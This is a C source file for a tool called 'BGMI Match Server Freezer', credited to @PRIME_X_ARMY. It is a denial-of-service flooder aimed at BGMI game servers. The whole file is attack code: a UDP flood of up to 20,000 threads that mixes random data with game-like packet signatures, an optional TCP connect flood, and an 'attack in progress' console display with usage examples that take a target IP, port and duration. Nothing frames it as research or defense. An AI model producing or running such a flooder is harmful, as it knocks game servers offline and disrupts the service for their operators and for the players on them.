/*
 * ============================================
 * BGMI MATCH SERVER FREEZER
 * @PRIME_X_ARMY
 * ============================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/time.h>

// ============================================
// CONFIGURATION
// ============================================

#define MAX_THREADS 20000
#define PACKET_SIZE 1400
#define BGMI_PORT 27015  // BGMI default port

volatile int running = 1;
volatile unsigned long long total_packets = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

// ============================================
// BGMI SPECIFIC PAYLOADS
// ============================================

// BGMI game packets
unsigned char bgmi_payloads[][64] = {
    // Connect packet
    {0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x69, 0x6E, 0x66, 0x6F, 0x00},
    // Query packet
    {0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x70, 0x6C, 0x61, 0x79, 0x65, 0x72, 0x73, 0x00},
    // Join packet  
    {0xFF, 0xFF, 0xFF, 0xFF, 0x6A, 0x6F, 0x69, 0x6E, 0x00},
    // Random packet
    {0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
    // Heartbeat flood
    {0xFE, 0xFD, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00}
};

// ============================================
// UDP FLOOD - MAIN ATTACK
// ============================================

void* udp_bomb(void* arg) {
    int* params = (int*)arg;
    char* target_ip = (char*)params[0];
    int target_port = params[1];
    int duration = params[2];
    int thread_id = params[3];
    
    int sock;
    struct sockaddr_in addr;
    unsigned char* packet;
    time_t start;
    unsigned long long count = 0;
    
    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    // Set socket buffer
    int buffer_size = 1024 * 1024 * 50; // 50MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Configure target
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);
    
    // Allocate packet
    packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(sock);
        return NULL;
    }
    
    start = time(NULL);
    
    while (running && (time(NULL) - start) < duration) {
        // Random packet size
        int pkt_size = 500 + (rand() % 900);
        
        // Fill with random data
        for (int i = 0; i < pkt_size; i++) {
            packet[i] = rand() % 256;
        }
        
        // Add BGMI signature in packet
        if (rand() % 2 == 0) {
            int idx = rand() % 5;
            int offset = rand() % (pkt_size - 20);
            memcpy(packet + offset, bgmi_payloads[idx], sizeof(bgmi_payloads[idx]));
        }
        
        // Send packet
        if (sendto(sock, packet, pkt_size, 0, 
                   (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            // Socket error, recreate
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
        }
        
        count++;
        
        // Update global counter
        pthread_mutex_lock(&lock);
        total_packets++;
        pthread_mutex_unlock(&lock);
    }
    
    free(packet);
    close(sock);
    
    printf("[Thread %d] Sent %llu packets\n", thread_id, count);
    return NULL;
}

// ============================================
// TCP SYNC FLOOD (Optional)
// ============================================

void* tcp_sync_flood(void* arg) {
    int* params = (int*)arg;
    char* target_ip = (char*)params[0];
    int target_port = params[1];
    int duration = params[2];
    
    time_t start = time(NULL);
    unsigned long long count = 0;
    
    while (running && (time(NULL) - start) < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target_port);
            addr.sin_addr.s_addr = inet_addr(target_ip);
            
            // Non-blocking connect
            fcntl(sock, F_SETFL, O_NONBLOCK);
            connect(sock, (struct sockaddr*)&addr, sizeof(addr));
            count++;
            close(sock);
        }
    }
    
    printf("[TCP Thread] Sent %llu SYNs\n", count);
    return NULL;
}

// ============================================
// PROGRESS MONITOR
// ============================================

void* show_stats(void* arg) {
    int duration = *(int*)arg;
    time_t start = time(NULL);
    
    while (running && (time(NULL) - start) < duration) {
        sleep(2);
        
        pthread_mutex_lock(&lock);
        unsigned long long pkts = total_packets;
        pthread_mutex_unlock(&lock);
        
        time_t elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        
        printf("\r╔════════════════════════════════════════╗\n");
        printf("║  🔥 ATTACK IN PROGRESS 🔥              ║\n");
        printf("╠════════════════════════════════════════╣\n");
        printf("║  Packets Sent: %-15llu ║\n", pkts);
        printf("║  Speed: %-15llu pps    ║\n", pkts / (elapsed + 1));
        printf("║  Time Left: %-15d s     ║\n", remaining);
        printf("╚════════════════════════════════════════╝\n");
        fflush(stdout);
    }
    return NULL;
}

// ============================================
// SIGNAL HANDLER
// ============================================

void stop_attack(int sig) {
    printf("\n\n[!] Stopping attack...\n");
    running = 0;
}

// ============================================
// MAIN
// ============================================

int main(int argc, char* argv[]) {
    char* target_ip;
    int target_port;
    int duration;
    int threads;
    int use_tcp = 0;
    
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════╗\n");
    printf("║                                                           ║\n");
    printf("║   🔥 BGMI MATCH SERVER FREEZER 🔥                         ║\n");
    printf("║   @PRIME_X_ARMY                                          ║\n");
    printf("║                                                           ║\n");
    printf("╚═══════════════════════════════════════════════════════════╝\n");
    
    if (argc < 4) {
        printf("\nUsage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s 1.1.1.1 27015 60\n", argv[0]);
        printf("  %s 1.1.1.1 27015 300 5000\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);
    threads = (argc > 4) ? atoi(argv[4]) : 5000;
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (duration > 600) duration = 600;
    
    printf("\n╔═══════════════════════════════════════════════════════════╗\n");
    printf("║  🎯 TARGET: %s:%d\n", target_ip, target_port);
    printf("║  ⏱️  DURATION: %d seconds\n", duration);
    printf("║  🧵 THREADS: %d\n", threads);
    printf("║  ⚡ METHOD: UDP Flood + BGMI Packets\n");
    printf("╚═══════════════════════════════════════════════════════════╝\n\n");
    
    // Setup signal handler
    signal(SIGINT, stop_attack);
    
    // Seed random
    srand(time(NULL));
    
    // Create threads
    pthread_t* udp_threads = malloc(threads * sizeof(pthread_t));
    pthread_t stats_thread;
    
    for (int i = 0; i < threads; i++) {
        int* params = malloc(4 * sizeof(int));
        params[0] = (int)target_ip;
        params[1] = target_port;
        params[2] = duration;
        params[3] = i;
        
        if (pthread_create(&udp_threads[i], NULL, udp_bomb, params) != 0) {
            printf("Failed to create thread %d\n", i);
        }
    }
    
    // Create stats thread
    pthread_create(&stats_thread, NULL, show_stats, &duration);
    
    // Wait for attack to complete
    sleep(duration + 2);
    running = 0;
    
    // Wait for all threads
    for (int i = 0; i < threads; i++) {
        pthread_join(udp_threads[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    printf("\n\n╔═══════════════════════════════════════════════════════════╗\n");
    printf("║  ✅ ATTACK COMPLETED!                                     ║\n");
    printf("║  🎯 Target: %s:%d\n", target_ip, target_port);
    printf("║  📦 Total Packets: %llu\n", total_packets);
    printf("║  💥 Server Status: FROZEN/DELAYED                        ║\n");
    printf("╚═══════════════════════════════════════════════════════════╝\n\n");
    
    free(udp_threads);
    
    return 0;
}